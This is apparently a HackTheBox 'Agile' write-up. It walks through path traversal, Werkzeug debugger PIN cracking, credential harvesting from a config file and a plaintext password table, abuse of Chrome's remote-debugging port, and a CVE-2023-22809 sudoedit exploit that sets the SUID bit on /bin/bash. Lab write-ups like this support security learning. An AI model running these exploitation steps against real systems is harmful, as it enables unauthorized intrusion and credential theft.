# agile

## services

### nmap scan:
```bash
└─$ nmap -sC -sV -o nmap/initial.nmap $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-23 18:55 EDT
Nmap scan report for 10.129.228.212
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.04 seconds
```
open ports:

* 22 - ssh - reveals Jammy OS according to Launchpad
* 80 - http - nginx 1.18.0 - url **superpass.htb**


## http

The server frequently loses connection to the database and returns an error message with the query. The query does not seem to be injectable as it uses parameterized variables.
But we are able to create an account on the site and from the /download page another error is returned. Its verbose and reveals the expected parameter of the request.
```python
with open(f'/tmp/{fn}', 'rb') as f:
```
So the web page /download expects the parameter ?fn=filename to read a file from. And its vulnerable to **path traversal** as we can retreive the /etc/passwd file without having to do any filter bypassing.

Some users of interest on the box:
```bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
edwards:x:1002:1002::/home/edwards:/bin/bash
corum:x:1000:1000:corum:/home/corum:/bin/bash
runner:x:1001:1001::/app/app-testing/:/bin/sh
```
unfortunately trying to grab files from the users in the /home directory fail with permission denied

Since we have no way of printing the contents of the directories we will have to pull from a list of well known linux files. To do this we can write up a quick python script to iterate through the list for us. inside /scripts

The error page returned is a debugger that contains a shell environment for code execution! This is the werkzeug debugger that works with flask.

### Werkzeug debugger

This debugger includes a shell environment where we can issue shell commmands in python, but its protected by a pin. Luckily with our **LFI** we are able to get all the information that goes into creating the pin.

This blog is extremely useful in reverse engineering the pin used to protect the console
https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/


## PE - www-data

creds found in /app/config_prod.json

``superpassuser:dSA6l7q*yIVs$39Ml6ywvgK``

These creds can be used to connect to the mysql db superpass:
```bash
(venv) www-data@agile:/app$ cat config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}(venv) www-data@agile:/app$
(venv) www-data@agile:/app$
(venv) www-data@agile:/app$ mysql -u superpassuser -p superpass
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 897
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
There is a passwords table inside of the superpass db:
```mysql

mysql> SELECT * FROM passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
5 rows in set (0.01 sec)
```
These are not password hashes! They are stored plaintext and the agile password for corum successfully authenticates to ssh.

## PE - corum

after running linpeas a process was highlighted that i need to look further into:
```bash
runner     41171  0.1  2.6 34023392 104768 ?     Sl   22:20   0:00      _ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.Zakvlz --window-size=1420,1080 data:,
```
The **--remote-debugging-port** option allows us to connect to the debugging session at localhost:41829

Since we don't have a display in the ssh connection we will need to use port forwarding from our local machine and open up chrome from there:
```bash
└─$ ssh -fN -L 9998:localhost:41829 corum@superpass.htb                                                             
```
Then open up chrome and we'll need to configure Network targets:
#### Configure Network Targets in Chrome

Open Chrome browser and input the following string in URL bar at the top of the window.
chrome://inspect/#devices

Then click “Configure…” at the right of “Discover network targets”. The modal window opens.
In the modal window, enter “localhost:9998” then click “Done”.
Now we should see the remote host appears at the bottom of the “Remote Target”.
Click “inspect” then new browser open. We can browse the website.

creds:
edwards:d07867c6267dcb5df0af


### PE - edwards

immediately we check for sudo prive with edwards and we get two commands, both using sudoedit:
```bash
edwards@agile:~$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```
This version of sudo on the box is vulnerable to CVE-2023-22809, a vulnerability that allows users to declare a separate file to edit while using sudoedit. So long as the user that we are editing a file with (in this case its dev_admin) has permission to the file we can edit it. 

So we could not just write to the sudoers file for an easy root, we had to find a file that dev_admin had write permissions to that would eventually be ran by root. By using find and searching for files owned by dev_admin or the group of dev_admin I found **/app/venv/bin/activate**

Looking in the currently running processes we can find a list of files files and search for activate mentioned in them with grep and we find activate being called with source in **test_and_update.sh**

Now we can just add suid bit to /bin/bash in the activate script and wait for test_and_update.sh to run. This is why the box is called agile, because the application is frequently being deployed.

```bash
edwards@agile:/app$ EDITOR="vi -- /app/venv/bin/activate" sudoedit -u dev_admin /app/config_test.json               3 files to edit                                            
sudoedit: -- unchanged                                     
sudoedit: /app/config_test.json unchanged
```
added ``chmod u+s /bin/bash``

wir haben wurzel!
